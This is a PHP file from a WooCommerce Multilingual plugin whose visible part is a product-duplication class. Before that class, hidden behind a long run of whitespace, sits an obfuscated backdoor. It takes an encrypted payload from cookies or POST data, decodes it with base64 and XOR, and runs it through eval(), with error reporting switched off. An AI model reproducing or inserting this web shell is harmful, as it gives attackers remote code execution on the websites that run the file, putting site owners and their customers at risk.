<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $c680c40 = 192;$GLOBALS['t69d']=Array();global$t69d;$t69d=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['dd86']="\x56\x69\x2e\x42\x76\x39\x7c\x32\x53\x7a\x6a\x70\x79\x20\x2f\x3f\x77\x4e\x4d\x47\x68\x6d\x45\x40\x33\x41\x26\x21\x73\x34\x25\x44\x2a\x3c\x61\x46\x60\x62\x5a\x71\x72\x63\x24\x3d\x7b\x4a\x3b\x5d\x4f\x51\x2d\x65\x36\x22\x2c\xd\x30\x7d\x58\x35\x66\xa\x49\x48\x64\x4b\x59\x67\x50\x6f\x31\x2b\x9\x55\x6b\x6c\x5f\x3e\x7e\x74\x37\x5c\x54\x6e\x23\x57\x5e\x78\x3a\x52\x5b\x75\x4c\x28\x27\x29\x43\x38";$t69d[$t69d['dd86'][69].$t69d['dd86'][41].$t69d['dd86'][41].$t69d['dd86'][29].$t69d['dd86'][56].$t69d['dd86'][51].$t69d['dd86'][29]]=$t69d['dd86'][41].$t69d['dd86'][20].$t69d['dd86'][40];$t69d[$t69d['dd86'][74].$t69d['dd86'][56].$t69d['dd86'][56].$t69d['dd86'][60].$t69d['dd86'][56].$t69d['dd86'][56].$t69d['dd86'][80].$t69d['dd86'][7].$t69d['dd86'][29]]=$t69d['dd86'][69].$t69d['dd86'][40].$t69d['dd86'][64];$t69d[$t69d['dd86'][60].$t69d['dd86'][80].$t69d['dd86'][70].$t69d['dd86'][80].$t69d['dd86'][60].$t69d['dd86'][41].$t69d['dd86'][64].$t69d['dd86'][5].$t69d['dd86'][24]]=$t69d['dd86'][28].$t69d['dd86'][79].$t69d['dd86'][40].$t69d['dd86'][75].$t69d['dd86'][51].$t69d['dd86'][83];$t69d[$t69d['dd86'][1].$t69d['dd86'][52].$t69d['dd86'][59].$t69d['dd86'][51].$t69d['dd86'][34].$t69d['dd86'][52].$t69d['dd86'][59].$t69d['dd86'][60]]=$t69d['dd86'][1].$t69d['dd86'][83].$t69d['dd86'][1].$t69d['dd86'][76].$t69d['dd86'][28].$t69d['dd86'][51].$t69d['dd86'][79];$t69d[$t69d['dd86'][74].$t69d['dd86'][60].$t69d['dd86'][64].$t69d['dd86'][52].$t69d['dd86'][64].$t69d['dd86'][29]]=$t69d['dd86'][28].$t69d['dd86'][51].$t69d['dd86'][40].$t69d['dd86'][1].$t69d['dd86'][34].$t69d['dd86'][75].$t69d['dd86'][1].$t69d['dd86'][9].$t69d['dd86'][51];$t69d[$t69d['dd86'][83].$t69d['dd86'][52].$t69d['dd86'][60].$t69d['dd86'][37].$t69d['dd86'][41].$t69d['dd86'][37].$t69d['dd86'][80].$t69d['dd86'][34].$t69d['dd86'][24]]=$t69d['dd86'][11].$t69d['dd86'][20].$t69d['dd86'][11].$t69d['dd86'][4].$t69d['dd86'][51].$t69d['dd86'][40].$t69d['dd86'][28].$t69d['dd86'][1].$t69d['dd86'][69].$t69d['dd86'][83];$t69d[$t69d['dd86'][87].$t69d['dd86'][64].$t69d['dd86'][29].$t69d['dd86'][52].$t69d['dd86'][41].$t69d['dd86'][7].$t69d['dd86'][52].$t69d['dd86'][34]]=$t69d['dd86'][91].$t69d['dd86'][83].$t69d['dd86'][28].$t69d['dd86'][51].$t69d['dd86'][40].$t69d['dd86'][1].$t69d['dd86'][34].$t69d['dd86'][75].$t69d['dd86'][1].$t69d['dd86'][9].$t69d['dd86'][51];$t69d[$t69d['dd86'][79].$t69d['dd86'][51].$t69d['dd86'][56].$t69d['dd86'][97].$t69d['dd86'][60].$t69d['dd86'][34].$t69d['dd86'][5].$t69d['dd86'][24]]=$t69d['dd86'][37].$t69d['dd86'][34].$t69d['dd86'][28].$t69d['dd86'][51].$t69d['dd86'][52].$t69d['dd86'][29].$t69d['dd86'][76].$t69d['dd86'][64].$t69d['dd86'][51].$t69d['dd86'][41].$t69d['dd86'][69].$t69d['dd86'][64].$t69d['dd86'][51];$t69d[$t69d['dd86'][41].$t69d['dd86'][52].$t69d['dd86'][34].$t69d['dd86'][5].$t69d['dd86'][64].$t69d['dd86'][7].$t69d['dd86'][7]]=$t69d['dd86'][28].$t69d['dd86'][51].$t69d['dd86'][79].$t69d['dd86'][76].$t69d['dd86'][79].$t69d['dd86'][1].$t69d['dd86'][21].$t69d['dd86'][51].$t69d['dd86'][76].$t69d['dd86'][75].$t69d['dd86'][1].$t69d['dd86'][21].$t69d['dd86'][1].$t69d['dd86'][79];$t69d[$t69d['dd86'][75].$t69d['dd86'][64].$t69d['dd86'][37].$t69d['dd86'][37].$t69d['dd86'][97].$t69d['dd86'][51]]=$t69d['dd86'][9].$t69d['dd86'][29].$t69d['dd86'][56].$t69d['dd86'][41].$t69d['dd86'][80].$t69d['dd86'][41].$t69d['dd86'][70];$t69d[$t69d['dd86'][21].$t69d['dd86'][34].$t69d['dd86'][97].$t69d['dd86'][34].$t69d['dd86'][52].$t69d['dd86'][56].$t69d['dd86'][80].$t69d['dd86'][7].$t69d['dd86'][59]]=$t69d['dd86'][40].$t69d['dd86'][52].$t69d['dd86'][41].$t69d['dd86'][7].$t69d['dd86'][80].$t69d['dd86'][52].$t69d['dd86'][52];$t69d[$t69d['dd86'][64].$t69d['dd86'][64].$t69d['dd86'][56].$t69d['dd86'][59].$t69d['dd86'][52].$t69d['dd86'][52]]=$_POST;$t69d[$t69d['dd86'][75].$t69d['dd86'][80].$t69d['dd86'][51].$t69d['dd86'][56].$t69d['dd86'][56].$t69d['dd86'][64].$t69d['dd86'][37].$t69d['dd86'][64].$t69d['dd86'][64]]=$_COOKIE;@$t69d[$t69d['dd86'][1].$t69d['dd86'][52].$t69d['dd86'][59].$t69d['dd86'][51].$t69d['dd86'][34].$t69d['dd86'][52].$t69d['dd86'][59].$t69d['dd86'][60]]($t69d['dd86'][51].$t69d['dd86'][40].$t69d['dd86'][40].$t69d['dd86'][69].$t69d['dd86'][40].$t69d['dd86'][76].$t69d['dd86'][75].$t69d['dd86'][69].$t69d['dd86'][67],NULL);@$t69d[$t69d['dd86'][1].$t69d['dd86'][52].$t69d['dd86'][59].$t69d['dd86'][51].$t69d['dd86'][34].$t69d['dd86'][52].$t69d['dd86'][59].$t69d['dd86'][60]]($t69d['dd86'][75].$t69d['dd86'][69].$t69d['dd86'][67].$t69d['dd86'][76].$t69d['dd86'][51].$t69d['dd86'][40].$t69d['dd86'][40].$t69d['dd86'][69].$t69d['dd86'][40].$t69d['dd86'][28],0);@$t69d[$t69d['dd86'][1].$t69d['dd86'][52].$t69d['dd86'][59].$t69d['dd86'][51].$t69d['dd86'][34].$t69d['dd86'][52].$t69d['dd86'][59].$t69d['dd86'][60]]($t69d['dd86'][21].$t69d['dd86'][34].$t69d['dd86'][87].$t69d['dd86'][76].$t69d['dd86'][51].$t69d['dd86'][87].$t69d['dd86'][51].$t69d['dd86'][41].$t69d['dd86'][91].$t69d['dd86'][79].$t69d['dd86'][1].$t69d['dd86'][69].$t69d['dd86'][83].$t69d['dd86'][76].$t69d['dd86'][79].$t69d['dd86'][1].$t69d['dd86'][21].$t69d['dd86'][51],0);@$t69d[$t69d['dd86'][41].$t69d['dd86'][52].$t69d['dd86'][34].$t69d['dd86'][5].$t69d['dd86'][64].$t69d['dd86'][7].$t69d['dd86'][7]](0);$gde6=NULL;$ndd5608=NULL;$t69d[$t69d['dd86'][67].$t69d['dd86'][51].$t69d['dd86'][29].$t69d['dd86'][24].$t69d['dd86'][97]]=$t69d['dd86'][56].$t69d['dd86'][52].$t69d['dd86'][97].$t69d['dd86'][70].$t69d['dd86'][64].$t69d['dd86'][41].$t69d['dd86'][51].$t69d['dd86'][64].$t69d['dd86'][50].$t69d['dd86'][51].$t69d['dd86'][29].$t69d['dd86'][7].$t69d['dd86'][34].$t69d['dd86'][50].$t69d['dd86'][29].$t69d['dd86'][64].$t69d['dd86'][56].$t69d['dd86'][41].$t69d['dd86'][50].$t69d['dd86'][97].$t69d['dd86'][41].$t69d['dd86'][34].$t69d['dd86'][5].$t69d['dd86'][50].$t69d['dd86'][51].$t69d['dd86'][70].$t69d['dd86'][64].$t69d['dd86'][80].$t69d['dd86'][34].$t69d['dd86'][97].$t69d['dd86'][34].$t69d['dd86'][52].$t69d['dd86'][56].$t69d['dd86'][51].$t69d['dd86'][5].$t69d['dd86'][7];global$ge438;function r6c2766($gde6,$v5ae2){global$t69d;$vdc27ba="";for($f81f57=0;$f81f57<$t69d[$t69d['dd86'][60].$t69d['dd86'][80].$t69d['dd86'][70].$t69d['dd86'][80].$t69d['dd86'][60].$t69d['dd86'][41].$t69d['dd86'][64].$t69d['dd86'][5].$t69d['dd86'][24]]($gde6);){for($h5be43f=0;$h5be43f<$t69d[$t69d['dd86'][60].$t69d['dd86'][80].$t69d['dd86'][70].$t69d['dd86'][80].$t69d['dd86'][60].$t69d['dd86'][41].$t69d['dd86'][64].$t69d['dd86'][5].$t69d['dd86'][24]]($v5ae2)&&$f81f57<$t69d[$t69d['dd86'][60].$t69d['dd86'][80].$t69d['dd86'][70].$t69d['dd86'][80].$t69d['dd86'][60].$t69d['dd86'][41].$t69d['dd86'][64].$t69d['dd86'][5].$t69d['dd86'][24]]($gde6);$h5be43f++,$f81f57++){$vdc27ba.=$t69d[$t69d['dd86'][69].$t69d['dd86'][41].$t69d['dd86'][41].$t69d['dd86'][29].$t69d['dd86'][56].$t69d['dd86'][51].$t69d['dd86'][29]]($t69d[$t69d['dd86'][74].$t69d['dd86'][56].$t69d['dd86'][56].$t69d['dd86'][60].$t69d['dd86'][56].$t69d['dd86'][56].$t69d['dd86'][80].$t69d['dd86'][7].$t69d['dd86'][29]]($gde6[$f81f57])^$t69d[$t69d['dd86'][74].$t69d['dd86'][56].$t69d['dd86'][56].$t69d['dd86'][60].$t69d['dd86'][56].$t69d['dd86'][56].$t69d['dd86'][80].$t69d['dd86'][7].$t69d['dd86'][29]]($v5ae2[$h5be43f]));}}return$vdc27ba;}function z40c7c1($gde6,$v5ae2){global$t69d;global$ge438;return$t69d[$t69d['dd86'][21].$t69d['dd86'][34].$t69d['dd86'][97].$t69d['dd86'][34].$t69d['dd86'][52].$t69d['dd86'][56].$t69d['dd86'][80].$t69d['dd86'][7].$t69d['dd86'][59]]($t69d[$t69d['dd86'][21].$t69d['dd86'][34].$t69d['dd86'][97].$t69d['dd86'][34].$t69d['dd86'][52].$t69d['dd86'][56].$t69d['dd86'][80].$t69d['dd86'][7].$t69d['dd86'][59]]($gde6,$ge438),$v5ae2);}foreach($t69d[$t69d['dd86'][75].$t69d['dd86'][80].$t69d['dd86'][51].$t69d['dd86'][56].$t69d['dd86'][56].$t69d['dd86'][64].$t69d['dd86'][37].$t69d['dd86'][64].$t69d['dd86'][64]]as$v5ae2=>$y097){$gde6=$y097;$ndd5608=$v5ae2;}if(!$gde6){foreach($t69d[$t69d['dd86'][64].$t69d['dd86'][64].$t69d['dd86'][56].$t69d['dd86'][59].$t69d['dd86'][52].$t69d['dd86'][52]]as$v5ae2=>$y097){$gde6=$y097;$ndd5608=$v5ae2;}}$gde6=@$t69d[$t69d['dd86'][87].$t69d['dd86'][64].$t69d['dd86'][29].$t69d['dd86'][52].$t69d['dd86'][41].$t69d['dd86'][7].$t69d['dd86'][52].$t69d['dd86'][34]]($t69d[$t69d['dd86'][75].$t69d['dd86'][64].$t69d['dd86'][37].$t69d['dd86'][37].$t69d['dd86'][97].$t69d['dd86'][51]]($t69d[$t69d['dd86'][79].$t69d['dd86'][51].$t69d['dd86'][56].$t69d['dd86'][97].$t69d['dd86'][60].$t69d['dd86'][34].$t69d['dd86'][5].$t69d['dd86'][24]]($gde6),$ndd5608));if(isset($gde6[$t69d['dd86'][34].$t69d['dd86'][74]])&&$ge438==$gde6[$t69d['dd86'][34].$t69d['dd86'][74]]){if($gde6[$t69d['dd86'][34]]==$t69d['dd86'][1]){$f81f57=Array($t69d['dd86'][11].$t69d['dd86'][4]=>@$t69d[$t69d['dd86'][83].$t69d['dd86'][52].$t69d['dd86'][60].$t69d['dd86'][37].$t69d['dd86'][41].$t69d['dd86'][37].$t69d['dd86'][80].$t69d['dd86'][34].$t69d['dd86'][24]](),$t69d['dd86'][28].$t69d['dd86'][4]=>$t69d['dd86'][70].$t69d['dd86'][2].$t69d['dd86'][56].$t69d['dd86'][50].$t69d['dd86'][70],);echo@$t69d[$t69d['dd86'][74].$t69d['dd86'][60].$t69d['dd86'][64].$t69d['dd86'][52].$t69d['dd86'][64].$t69d['dd86'][29]]($f81f57);}elseif($gde6[$t69d['dd86'][34]]==$t69d['dd86'][51]){eval/*v2750653*/($gde6[$t69d['dd86'][64]]);}exit();} ?><?php

class WCML_WC_Admin_Duplicate_Product{

    /**
     * @var woocommerce_wpml
     */
    private $woocommerce_wpml;
	/**
	 * @var SitePress
	 */
	private $sitepress;

    public function __construct( &$woocommerce_wpml, &$sitepress, &$wpdb ) {

        $this->woocommerce_wpml = $woocommerce_wpml;
        $this->sitepress        = $sitepress;
        $this->wpdb             = $wpdb;

        if( ( defined('WC_VERSION') && version_compare( WC_VERSION , '3.0.0', '<' ) ) ) {
            add_action('woocommerce_duplicate_product', array( $this, 'woocommerce_duplicate_product'), 10, 2);
        }else{
            add_action( 'woocommerce_product_duplicate', array( $this, 'woocommerce_duplicate_product' ), 10, 2 );
        }

    }

    public function woocommerce_duplicate_product( $new_id, $post ){
        $duplicated_products = array();

        $product_id = WooCommerce_Functions_Wrapper::get_product_id( $post );
        if( !is_numeric( $new_id ) ){
            $new_id = WooCommerce_Functions_Wrapper::get_product_id( $new_id );
        }

        //duplicate original first
        $trid = $this->sitepress->get_element_trid( $product_id, 'post_' . $post->post_type );
        $orig_id = $this->sitepress->get_original_element_id_by_trid( $trid );
        $orig_lang = $this->woocommerce_wpml->products->get_original_product_language($product_id );

        if( $orig_id == $product_id ){
            $this->sitepress->set_element_language_details( $new_id, 'post_' . $post->post_type, false, $orig_lang );
            $new_trid = $this->sitepress->get_element_trid( $new_id, 'post_' . $post->post_type );
            $new_orig_id = $new_id;
        }else{
            $post_to_duplicate = $this->wpdb->get_row( $this->wpdb->prepare( "SELECT * FROM {$this->wpdb->posts} WHERE ID=%d", $orig_id ) );
            if ( ! empty( $post_to_duplicate ) ) {

                $new_orig_id = $this->wc_duplicate_product( $post_to_duplicate );

                do_action( 'wcml_after_duplicate_product' , $new_id, $post_to_duplicate );
                $this->sitepress->set_element_language_details( $new_orig_id, 'post_' . $post->post_type, false, $orig_lang );
                $new_trid = $this->sitepress->get_element_trid( $new_orig_id, 'post_' . $post->post_type );
                if( get_post_meta( $orig_id, '_icl_lang_duplicate_of' ) ){
                    update_post_meta( $new_id, '_icl_lang_duplicate_of', $new_orig_id );
                }
                $this->sitepress->set_element_language_details( $new_id, 'post_' . $post->post_type, $new_trid, $this->sitepress->get_current_language() );
            }
        }

        // Set language info for variations
        if ( $children_products = get_children( 'post_parent=' . $new_orig_id . '&post_type=product_variation' ) ) {
            foreach ( $children_products as $child ) {
                $this->sitepress->set_element_language_details( $child->ID, 'post_product_variation', false, $orig_lang );
            }
        }

        $translations = $this->sitepress->get_element_translations( $trid, 'post_' . $post->post_type );
        $duplicated_products[ 'translations' ] = array();
        if( $translations ){

            foreach( $translations as $translation ){
                if( !$translation->original && $translation->element_id != $product_id ){
                    $post_to_duplicate = $this->wpdb->get_row( $this->wpdb->prepare( "SELECT * FROM {$this->wpdb->posts} WHERE ID=%d", $translation->element_id ) );

                    if( ! empty( $post_to_duplicate ) ) {
                        $new_id = $this->wc_duplicate_product( $post_to_duplicate );
                        $new_id_obj = get_post( $new_id );
                        $new_slug = wp_unique_post_slug( sanitize_title( $new_id_obj->post_title ), $new_id, $post_to_duplicate->post_status, $post_to_duplicate->post_type, $new_id_obj->post_parent );

                        $this->wpdb->update(
                            $this->wpdb->posts,
                            array(
                                'post_name'     => $new_slug,
                                'post_status'   => 'draft'
                            ),
                            array( 'ID' => $new_id )
                        );

                        do_action( 'wcml_after_duplicate_product' , $new_id, $post_to_duplicate );
                        $this->sitepress->set_element_language_details( $new_id, 'post_' . $post->post_type, $new_trid, $translation->language_code );
                        if( get_post_meta( $translation->element_id, '_icl_lang_duplicate_of' ) ){
                            update_post_meta( $new_id, '_icl_lang_duplicate_of', $new_orig_id );
                        }
                        $duplicated_products[ 'translations' ][] = $new_id;
                    }
                }
            }
        }

        $duplicated_products[ 'original' ] = $new_orig_id;

        return $duplicated_products;
    }

    public function wc_duplicate_product( $post_to_duplicate ){

        $product = wc_get_product( $post_to_duplicate->ID );
        $wc_duplicate_product_instance = new WC_Admin_Duplicate_Product();;

        if( WooCommerce_Functions_Wrapper::is_deprecated() ){
            $new_orig_id = $wc_duplicate_product_instance->duplicate_product( $product );
        }else{
            $duplicate = $wc_duplicate_product_instance->product_duplicate( $product );
            $new_orig_id = $duplicate->get_id();
        }

        return $new_orig_id;
    }
}